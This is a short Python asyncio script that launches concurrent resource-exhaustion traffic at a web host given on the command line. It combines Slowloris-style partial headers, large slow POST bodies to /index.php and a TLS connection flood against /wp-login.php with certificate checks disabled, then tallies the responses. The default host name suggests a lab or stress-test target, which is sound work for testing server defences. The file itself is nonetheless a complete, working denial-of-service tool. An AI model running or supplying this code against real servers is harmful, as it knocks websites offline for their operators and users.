import asyncio
import ssl
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "sp-web"
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
stats = {"ok": 0, "refused": 0, "err": 0}


async def slow(i):
    try:
        r, w = await asyncio.open_connection(HOST, 8080)
        w.write(b"GET / HTTP/1.1\r\nHost: x\r\nX-a: ")
        await w.drain()
        await asyncio.sleep(25)
        w.close()
    except Exception:
        stats["err"] += 1


async def bigpost(i):
    try:
        r, w = await asyncio.open_connection(HOST, 8080)
        w.write(b"POST /index.php HTTP/1.1\r\nHost: x\r\nContent-Length: 900000\r\n\r\n")
        for _ in range(900):
            w.write(b"A" * 1000)
            await w.drain()
        await asyncio.wait_for(r.read(100), 5)
        stats["ok"] += 1
        w.close()
    except Exception:
        stats["err"] += 1


async def tlsflood(i):
    try:
        r, w = await asyncio.open_connection(HOST, 8443, ssl=ctx)
        w.write(b"GET /wp-login.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        await w.drain()
        d = await asyncio.wait_for(r.read(100), 5)
        stats["ok" if d else "refused"] += 1
        w.close()
    except Exception:
        stats["refused"] += 1


async def quick(i):
    try:
        r, w = await asyncio.open_connection(HOST, 8080)
        w.write(b"GET /wp-login.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        await w.drain()
        d = await asyncio.wait_for(r.read(100), 5)
        stats["ok" if d else "refused"] += 1
        w.close()
    except Exception:
        stats["refused"] += 1


async def main():
    t = time.time()
    tasks = (
        [bigpost(i) for i in range(150)]
        + [slow(i) for i in range(30)]
        + [tlsflood(i) for i in range(100)]
    )
    await asyncio.gather(*tasks)
    print(stats, round(time.time() - t, 1), "s")


asyncio.run(main())
